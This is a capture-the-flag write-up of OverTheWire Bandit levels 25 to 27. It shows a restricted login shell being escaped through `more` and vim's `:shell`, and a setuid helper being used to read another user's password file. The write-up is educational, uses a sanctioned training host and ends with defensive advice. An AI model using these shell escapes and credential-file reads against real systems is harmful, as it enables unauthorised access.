@@ -1,0 +1,200 @@
+# Bandit Level 25 → 26 -> 27
+
+## Objective
+
+Logging in to `bandit26` from `bandit25` should be fairly easy… The shell for user `bandit26` is not `/bin/bash`, but something else. Find out what it is, how it works and how to break out of it.
+
+*NOTE: if you’re a Windows user and typically use Powershell to `ssh` into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.*
+
+## Concept Tested
+
+Restricted login shells (a custom binary set as a user's shell in `/etc/passwd`) and pager-based shell escapes. Using a program's intended feature (opening an external editor from `more`) to jailbreak out of a locked-down environment.
+
+## Initial Access
+
+Establish an SSH session to the target host as user `bandit25`:
+
+```bash
+$ ssh bandit25@bandit.labs.overthewire.org -p 2220
+bandit25@bandit.labs.overthewire.org's password: [REDACTED]
+bandit25@bandit:~$
+```
+
+## Recon
+
+Since the objective this time didn't tell me about where the password was located or if there was a password to locate. I decided to just run the list command to see if there is anything relevant that will answer my question on whether it's a password login or not.
+
+```bash
+bandit25@bandit:~$ ls -la
+total 40
+drwxr-xr-x   2 root     root     4096 Jun 24 14:59 .
+drwxr-xr-x 150 root     root     4096 Jun 24 15:02 ..
+-rw-r-----   1 bandit25 bandit25   33 Jun 24 14:59 .bandit24.password
+-rw-r-----   1 bandit25 bandit25  151 Jun 24 14:59 .banner
+-rw-r--r--   1 root     root      220 Feb 13  2026 .bash_logout
+-rw-r--r--   1 root     root     3851 Jun 24 14:50 .bashrc
+-rw-r-----   1 bandit25 bandit25   66 Jun 24 14:59 .flag
+-rw-r-----   1 bandit25 bandit25    4 Jun 24 14:59 .pin
+-rw-r--r--   1 root     root      807 Feb 13  2026 .profile
+-r--------   1 bandit25 bandit25 2602 Jun 24 14:59 bandit26.sshkey
+```
+
+Upon running the list command it revealed that a private key file, readable only by me and its name of the next level I am trying to reach, gave me enough evidence to pursue this key-based auth instead of a password to get to the next level — same pattern as level 13→14.
+
+```bash
+bandit25@bandit:~$ cat bandit26.sshkey
+-----BEGIN OPENSSH PRIVATE KEY-----
+...
+-----END OPENSSH PRIVATE KEY-----
+bandit25@bandit:~$ exit
+[Laptop-3344]:~$ nano private_key
+[ENTERED OPENSSH PRIVATE KEY]
+```
+
+I `cat` the file so I can copy the key and saved it to my device so I can attempt to log into the next level.
+
+First thing I did after I saved the key was as done in the level 13->14. I changed the permissions of the private key and then attempted to login into `bandit26`.
+
+```bash
+[Laptop-3344]:~$ chmod 700 private_key
+[Laptop-3344]:~$ ssh -i private_key bandit26@bandit.labs.overthewire.org -p 2220
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
+Connection to bandit.labs.overthewire.org closed.
+```
+
+It connected to it, then printed the banner but then immediately disconnects back to my device home directory. Getting kicked out after successful key auth (not an auth failure) told me something in `bandit26`'s session setup (not credentials) was ending the connection.
+
+For a closer observation on what might be going on, I logged back into `bandit25` to check the `/etc/passwd` for `bandit26`, since `bandit26` clearly wasn't dropping me into an interactive `bash`.
+
+```bash
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+```
+
+I checked `/etc/passwd` because its last field is each user's login shell (the program that runs the moment they authenticate) would reveal a hint of some sorts as to the problem. By checking `/etc/passwd` it has been revealed that the real cause for this shell issue for `bandit26` is that the shell is a custom binary, `/usr/bin/showtext`, not a real shell at all.
+
+```bash
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+```
+
+Since `showtext` is a plain shell script (not a compiled binary), I could just read its source directly. It sets a terminal type, runs `more` on a text file in bandit26's home directory, and then unconditionally exits. That `exit 0` is the culprit — the instant `more` finishes displaying the file, the script ends and SSH tears down the session, which is exactly the immediate-disconnect behavior I saw.
+`more` only enters its interactive paging mode (`--More--` prompt, waiting for keypresses) when the content is taller than the terminal window. If the file fits on one screen, `more` prints it and returns instantly which is what was happening. So I believe the path forward is to make my terminal artificially short so `more` is forced to pause instead of finishing immediately.
+
+## Solution
+
+So to accomplish the task as explained in the Recon section, first I'm going to minimize my terminal screen tab small enough to where you can see just two lines in the terminal in an attempt to create that interactive `more` shell.
+
+```bash
+[Laptop-3344]:~$ ssh -i private_key bandit26@bandit.labs.overthewire.org -p 2220
+  _                     _ _ _   ___   __
+--More--(16%)
+```
+
+ With a very small terminal, `text.txt`'s content no longer fits on one screen, so `more` can't finish in a single pass. It stops and shows a `--More--` prompt as displayed above instead of exiting, keeping the session alive long enough for me to interact with it.
+
+```bash
+--More--(16%)
+v
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
+~
+~
+~
+~
+~
+~
+~
+~
+                                                                                                      1,3           All
+```
+
+At the `--More--` prompt, `more` supports a small set of interactive commands, and `v` is documented to open the current file in a text editor (`vi`/`vim` by default). A legitimate feature meant for "edit what I'm viewing," not an intentional backdoor. Pressing it dropped me straight into a `vim` session, still running with `bandit26`'s identity.
+
+```bash
+:set shell=/bin/bash
+:shell
+[No write since last change]
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
+[REDACTED]
+```
+
+Vim has a built-in `:shell` command that spawns an interactive subshell using whatever `shell` option is configured. By default this may point to a restricted shell or nothing usable, so I explicitly set it to `/bin/bash` first to guarantee a real, unrestricted shell comes up. This is the actual "jailbreak" moment: vim, running as `bandit26`, forks a full bash process that inherits `bandit26`'s privileges completely bypassing `showtext` since I never go back through it.
+
+Doing this gave me the password for bandit level 26. But glancing at level 27, it stated that the password was located in `bandit26` activity as well so I ran the list command.
+
+```bash
+bandit26@bandit:~$ ls -la
+total 44
+drwxr-xr-x   3 root     root      4096 Jun 24 14:59 .
+drwxr-xr-x 150 root     root      4096 Jun 24 15:02 ..
+-rw-r--r--   1 root     root       220 Feb 13  2026 .bash_logout
+-rw-r--r--   1 root     root      3851 Jun 24 14:50 .bashrc
+-rw-r--r--   1 root     root       807 Feb 13  2026 .profile
+drwxr-xr-x   2 root     root      4096 Jun 24 14:59 .ssh
+-rwsr-x---   1 bandit27 bandit26 14880 Jun 24 14:59 bandit27-do
+-rw-r-----   1 bandit26 bandit26   258 Jun 24 14:59 text.txt
+```
+
+Found a setuid binary file (`bandit27-do`) owned by `bandit27` sitting in `bandit26`'s home, same pattern as `bandit20-do` back in level 19. Confirming `bandit27` password can be retrieved here.
+
+```bash
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+bandit26@bandit:~$ ./bandit27-do id
+uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+[REDACTED]
+```
+
+I did essentially the same thing I did in level 19->20, follow the same `bandit27-do` setuid pattern as level 19→20. Running it with an argument that reads `/etc/bandit_pass/bandit27` while its effective UID is `bandit27`.
+
+
+## Verification
+
+Authenticate as `bandit26` and `bandit27` using the retrieved passwords:
+
+```bash
+[Laptop-3344]:~$ ssh bandit26@bandit.labs.overthewire.org -p 2220
+bandit26@bandit.labs.overthewire.org's password: [REDACTED]
+bandit26@bandit:~$ whoami
+bandit26
+bandit26@bandit:~$ exit
+
+[Laptop-3344]:~$ ssh bandit27@bandit.labs.overthewire.org -p 2220
+bandit27@bandit.labs.overthewire.org's password: [REDACTED]
+bandit27@bandit:~$ whoami
+bandit27
+```
+
+**Explanation:** Initiating a new SSH session to port `2220` and supplying the retrieved password at the prompt grants access. Running `whoami` and observing the updated shell prompt (`bandit26@bandit:~$` and `bandit27@bandit:~$`) confirms successful authentication as `bandit26` and `bandit27`.
+
+## Why This Works
+
+`/etc/passwd`'s shell field is trusted unconditionally by the login process as "whatever program to run for this user's session". The system doesn't distinguish between a real shell and an arbitrary script that merely behaves like one for a moment. `showtext` was clearly designed as a restricted "read-only" experience: show a banner, then terminate before the user ever gets a real prompt. But it delegates the actual display work to `more`, a full-featured general-purpose pager that was never designed to be a security boundary. Its editor-launching feature (`v`) assumes it's always being run by a trusted user in a trusted context. Once vim spawns as a subprocess, it's a completely independent, full-featured program with its own shell-escape capability, and it has no awareness that it's supposed to be "trapped" inside a restricted session, it just does what vim always does.
+
+## Key Takeaway
+
+Never build a restricted/locked-down shell environment out of general-purpose interactive tools (pagers, editors, `less`, `vim`, `top`, etc.) without explicitly disabling their shell-escape features — tools like `more`, `less`, and `vim` are common, well-known jailbreak vectors (see GTFOBins) precisely because they were designed for trusted interactive use, not sandboxing. If you need a genuinely restricted shell, use a purpose-built one (like `rbash` with a locked-down `PATH` and no interactive sub-tools available) and audit every program it can reach for escape hatches.
+
+## Password
+
+`[REDACTED - see level for retrieval method]`
+
+
+---
